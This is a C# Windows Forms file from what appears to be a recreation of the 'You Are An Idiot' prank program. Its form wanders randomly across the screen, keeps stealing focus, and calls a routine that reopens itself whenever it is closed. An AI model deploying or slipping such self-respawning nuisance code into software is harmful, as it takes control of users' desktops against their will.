namespace YouAreAnIdiot
{
    public partial class Form1 : Form
    {
        private readonly Random _random = new();
        private readonly System.Windows.Forms.Timer _timer = new();
        private Point _targetLocation;

        public Form1()
        {
            InitializeComponent();
            Program.PlaySound();
            if (Program.i > 1 && !Program.SafeMode)
            {
                InitializeMovement();
                if (Program.i > 3)
                {
                    Program.FocusWindow = true;
                }
            }
        }

        private void InitializeMovement()
        {
            StartPosition = FormStartPosition.Manual;
            Location = GetRandomLocation();

            _timer.Interval = 50; // Move every 50 ms
            _timer.Tick += Timer_Tick!;
            _timer.Start();
        }

        private void Timer_Tick(object sender, EventArgs e)
        {
            var dx = _targetLocation.X - Location.X;
            var dy = _targetLocation.Y - Location.Y;

            // Move a small distance towards the target location
            Location = new Point(Location.X + dx / 10, Location.Y + dy / 10);

            // Always pick a new target location after moving
            _targetLocation = GetRandomLocation();

            if (Program.FocusWindow)
            {
                Activate();
            }
        }

        private Point GetRandomLocation()
        {
            int x = _random.Next(Math.Abs(Screen.PrimaryScreen!.WorkingArea.Width - Width));
            int y = _random.Next(Math.Abs(Screen.PrimaryScreen.WorkingArea.Height - Height));
            return new Point(x, y);
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Program.OpenItself();
        }
    }
}
